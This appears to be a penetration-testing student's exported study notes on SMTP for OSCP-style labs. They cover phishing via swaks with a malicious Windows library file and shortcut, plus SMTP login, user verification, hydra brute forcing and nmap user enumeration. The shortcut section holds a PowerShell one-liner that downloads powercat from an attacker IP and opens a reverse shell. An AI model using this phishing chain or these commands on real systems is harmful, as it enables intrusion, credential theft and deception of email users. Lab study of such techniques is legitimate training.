<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SMTP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SMTP</h1><br/><p>Default port is 25. Unlike POP &amp; IMAP which are inbox only, SMTP can be used to send emails.</p><p></p><p>[OSCP 44-45, &amp; CTF B 30-31, &amp; CTF 75-76]</p><p></p><p><a name="Malicious Email"></a><h1>Send Malicious Email with swaks (Phishing)</h1></p><p>[CTF B 30-31] Also see Client-Side Atks: OSCP 73-86</p><p></p><p>Offsec covered 2 methods- A) Malicious macro in Microsoft Office [OSCP 77-80]</p><p>B) Abusing Windows Library Files &amp; Windows Shorcut File (<strong>.lnk</strong>) served via WebDAV server [OSCP 80-85 &amp; CTF B 30-31]</p><p></p><p><h2>Setup (Windows Library Files &amp; Windows Shorcut File)</h2></p><p></p><p><h3>Allow Through Firewall</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span>Create FW rule to allow incoming connection through (target will likely be routed thru the host running the SMTP server ). IRL need to setup NAT, ngrok, or something.</p><p></p><p><h3>WebDAV Server</h3></p><p>Create dir that&#39;ll act as root dir for WebDAV server (e.g mkdir ~/offsec/webdav)</p><p></p><p><em>/home/asura/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/asura/Documents/offsec/webdav</em></p><p></p><p><h3>Create Windows Library File</h3></p><p>Using a Windows machine &amp; Visual Studio Code, create <a href="file:///home/asura/Documents/offsec/config.Library-ms">file</a> named <strong>config.Library-ms </strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Warning</span>: If you test the file by 2x clicking it with Windows host, you&#39;ll need to reset this file. It <span style="color:#ff0000;">changes after being used</span> 1ce!</p><p></p><p><h3>Create Shortcut File</h3></p><p>[OSCP 84-85]</p><p>For ex, If serving /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 on port 8000 HTTP server &amp; using &quot;rlrwap nc -lvnp 4444&quot;</p><p>Q: Does this need to bypass execution policy to run the powershell script, powercat? Also likely need AV bypass (e.g modify powercat script, etc)</p><p></p><p><em>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.5:8000/powercat.ps1&#39;); powercat -c 192.168.119.5 -p 4444 -e powershell&quot;</em></p><p></p><p>Export it from Windows machine to  ~/offsec/webdav</p><p></p><p><h3>Serve Powercat</h3></p><p>Use a normal python HTTP server, &amp; serve powercat.ps1 in the location specified in the aforementioned Shortcut File</p><p></p><p><h3>Send Email via Compromised Acct &amp; Target SMTP Server</h3></p><p>[CTF B 31]</p><p><em>sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server SMTP_SERVER_IP --body @body.txt --header &quot;Subject: Staging Script&quot; --suppress-data -ap</em></p><p></p><p>You&#39;ll be prompted for a Username (e.g john) &amp; their Password</p><p></p><p><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span></p><p><h1>Connect to Server</h1></p><p>May be times where only <strong>telnet</strong> works &amp; not <strong>nc</strong> (or vice versa?). For ex, may only see Server Resp when using <strong>telnet</strong></p><p></p><p><strong>EHLO all	</strong>	(List capabilities, outputs allowed commands)</p><p><strong>HELO all</strong>		(Output Domain Name)</p><p><strong>HELP</strong></p><p></p><p><h2>Authenticate via this Connection</h2><h2></h2></p><p><h2></h2>Different kinds of <a href="https://www.samlogic.net/articles/smtp-commands-reference-auth.htm">AUTH</a> (e.g LOGIN, PLAIN, etc).<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><strong>EHLO ALL</strong>		(Had to do this first or else “Bad sequence of cmds” ? May be bc of previously exiting telnet ungracefully? idk)</p><p><strong>AUTH LOGIN</strong></p><p>Server Resp with B64 prompt for Username, &amp; you enter the B64-Encoded Username</p><p>Server Resp with B64 prompt for Password, &amp; you enter the B64-Encoded Password</p><p></p><p>Can B64 Encode like- <em>echo </em><em><span style="color:#ff0000;">-n</span></em><em> ‘bob’ | base64</em></p><p></p><p><h3>AUTH PLAIN</h3></p><p>I believe creds need to be generated using the <a href="https://stackoverflow.com/questions/6921920/how-to-use-user-name-and-password-in-auth-plain">following syntax</a>, after the <strong>EHLO ALL</strong>.</p><p>echo -ne &quot;\0username\0password&quot;|base64</p><p></p><p><h3>Verify Recipient</h3></p><p>After sign-in (verifying sender&#39;s creds), can verify the recipient user exists like-</p><p></p><p><strong>VRFY jim</strong>		(Don&#39;t need to incl the domain like @relia.com)</p><p></p><p>If that&#39;s disabled, specify the sender &amp; then the recipient like-</p><p></p><p><strong>MAIL FROM:</strong><em>maildmz@relia.com</em><strong></strong></p><p><strong>RCPT TO:</strong><em>jim</em>		(<span style="color:#ff0000;">Don&#39;t NEED to incl the domain</span> like @relia.com, but <span style="color:#ff0000;">CAN incl the domain</span> to verify it&#39;s correct. For ex- jim@relia.net fails!)</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Success</span>: 250 OK 	<span style="color:#8ff0a4;text-decoration:underline;">Fail</span>: 550 Unknown user</p><p></p><p></p><p><h1>Brute Force </h1><h1></h1></p><p><h1></h1><em>hydra -L usernames.txt -P passwds.txt -V SERVER smtp</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1>User Enum</h1></p><p></p><p><em>nmap --script smtp-enum-users</em> -p 25,465,587 IP 		(Probably uses wordlist &amp; can miss users)</p><p></p><p><h2>Passing Credentials</h2></p><p>Supply plain-txt creds (not B64) like so-</p><p></p><p><em>nmap --script smtp-enum-users --script-args &quot;userdb=/dev/shm/f.miller_pass.smtp,passdb=/dev/shm/f.miller_user.smtp&quot; 10.10.128.13 -p 25,465,587</em></p><p></p><p><h1>Tips</h1><ul><li>Companies may have &gt;1 email domain (esp large companies!). For ex-<strong> f.miller@skylark.com</strong> &amp; <strong>sales@sklark.jp</strong>.</li></ul></p><p><ul><li>User may have diff password for email than they do for Acct, or it may be the same.</li></ul></p><p><ul><li>Like any other SVC, there may be an exploit allowing for things like RCE depending on SW used.</li></ul></p></div>
</body>
</html>
